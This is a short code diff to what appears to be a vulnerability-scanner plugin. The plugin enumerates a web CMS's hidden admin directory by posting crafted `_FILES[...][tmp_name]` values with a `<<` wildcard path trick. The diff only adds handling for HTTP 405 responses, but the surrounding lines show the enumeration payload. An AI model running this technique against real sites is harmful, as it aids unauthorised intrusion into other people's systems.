@@ -45,6 +45,8 @@ def prove(data):
                         _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=pre)
                         r = curl('post', url, data=_data)
                         if r!=None:
+                            if r.status_code == 405:
+                                return data
                             if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                 flag = 1
                                 back_dir = pre
@@ -65,7 +67,9 @@ def prove(data):
                             break
                         _data["_FILES[mochazz][tmp_name]"] = _data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                         r = curl('post', url, data=_data)
-                        if r != None:
+                        if r!=None:
+                            if r.status_code == 405:
+                                return data
                             if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                                 back_dir += ch
                                 _data["_FILES[mochazz][tmp_name]"] = "./{p}<</images/adminico.gif"
